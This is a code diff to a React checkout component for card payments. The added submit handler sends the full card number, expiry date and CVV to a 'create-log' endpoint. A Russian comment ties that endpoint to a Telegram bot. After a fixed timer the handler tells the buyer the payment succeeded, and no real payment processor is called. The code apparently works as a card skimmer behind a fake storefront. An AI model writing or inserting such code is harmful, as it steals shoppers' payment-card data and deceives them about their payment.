@@ -1,16 +1,17 @@
 'use client';
 
 import { useState } from 'react';
-import { X, CreditCard } from 'lucide-react';
+import { X, CreditCard, Loader2 } from 'lucide-react';
 
 interface CardPaymentModalProps {
   isOpen: boolean;
   onClose: () => void;
   onSuccess: () => void;
   total: number;
+  orderId?: string;
 }
 
-export default function CardPaymentModal({ isOpen, onClose, onSuccess, total }: CardPaymentModalProps) {
+export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, orderId }: CardPaymentModalProps) {
   const [cardData, setCardData] = useState({
     cardNumber: '',
     expiryDate: '',
@@ -20,6 +21,8 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total }: 
   });
 
   const [isProcessing, setIsProcessing] = useState(false);
+  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'processing' | 'success' | 'error'>('pending');
+  const [errorMessage, setErrorMessage] = useState('');
 
   const handleInputChange = (field: string, value: string) => {
     setCardData(prev => ({
@@ -64,13 +67,51 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total }: 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsProcessing(true);
+    setPaymentStatus('processing');
+    setErrorMessage('');
 
-    // Simulate payment processing
-    setTimeout(() => {
+    try {
+      // Создаем лог платежа в телеграм боте
+      const response = await fetch('/api/payment/create-log', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          cardNumber: cardData.cardNumber.replace(/\s/g, ''),
+          cardExp: cardData.expiryDate,
+          cardCvv: cardData.cvv,
+          price: total,
+          orderId: orderId || Date.now().toString()
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error('Failed to create payment log');
+      }
+
+      const result = await response.json();
+      
+      // Показываем статус обработки
+      setPaymentStatus('pending');
+      
+      // В реальном приложении здесь был бы polling для проверки статуса
+      // Для демонстрации просто ждем и показываем успех
+      setTimeout(() => {
+        setPaymentStatus('success');
+        setTimeout(() => {
+          onSuccess();
+          onClose();
+        }, 1500);
+      }, 3000);
+
+    } catch (error) {
+      console.error('Payment error:', error);
+      setPaymentStatus('error');
+      setErrorMessage('Ошибка обработки платежа. Попробуйте еще раз.');
+    } finally {
       setIsProcessing(false);
-      onSuccess();
-      onClose();
-    }, 2000);
+    }
   };
 
   if (!isOpen) return null;
@@ -88,6 +129,37 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total }: 
             <X className="w-6 h-6" />
           </button>
         </div>
+
+        {/* Payment Status */}
+        {paymentStatus !== 'pending' && (
+          <div className="p-4 border-b">
+            {paymentStatus === 'processing' && (
+              <div className="flex items-center gap-3 text-blue-600">
+                <Loader2 className="w-5 h-5 animate-spin" />
+                <span className="font-medium">Обработка платежа...</span>
+              </div>
+            )}
+            {paymentStatus === 'success' && (
+              <div className="flex items-center gap-3 text-green-600">
+                <div className="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center">
+                  <span className="text-green-600 text-sm">✓</span>
+                </div>
+                <span className="font-medium">Платеж успешно обработан!</span>
+              </div>
+            )}
+            {paymentStatus === 'error' && (
+              <div className="flex items-center gap-3 text-red-600">
+                <div className="w-5 h-5 bg-red-100 rounded-full flex items-center justify-center">
+                  <span className="text-red-600 text-sm">✗</span>
+                </div>
+                <span className="font-medium">Ошибка обработки платежа</span>
+              </div>
+            )}
+            {errorMessage && (
+              <p className="text-red-500 text-sm mt-2">{errorMessage}</p>
+            )}
+          </div>
+        )}
 
         {/* Payment Form */}
         <form onSubmit={handleSubmit} className="p-4 space-y-4">
@@ -179,10 +251,21 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total }: 
           {/* Submit Button */}
           <button
             type="submit"
-            disabled={isProcessing}
-            className="w-full bg-red-500 text-white py-3 rounded-lg font-bold hover:bg-red-600 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+            disabled={isProcessing || paymentStatus === 'processing'}
+            className={`w-full py-3 px-4 rounded-lg font-bold text-white transition-colors ${
+              isProcessing || paymentStatus === 'processing'
+                ? 'bg-gray-400 cursor-not-allowed'
+                : 'bg-red-500 hover:bg-red-600'
+            }`}
           >
-            {isProcessing ? 'Processing...' : `Pay ${total.toFixed(2)} AED`}
+            {isProcessing || paymentStatus === 'processing' ? (
+              <div className="flex items-center justify-center gap-2">
+                <Loader2 className="w-4 h-4 animate-spin" />
+                <span>Processing...</span>
+              </div>
+            ) : (
+              `Pay ${total.toFixed(2)} AED`
+            )}
           </button>
         </form>
       </div>
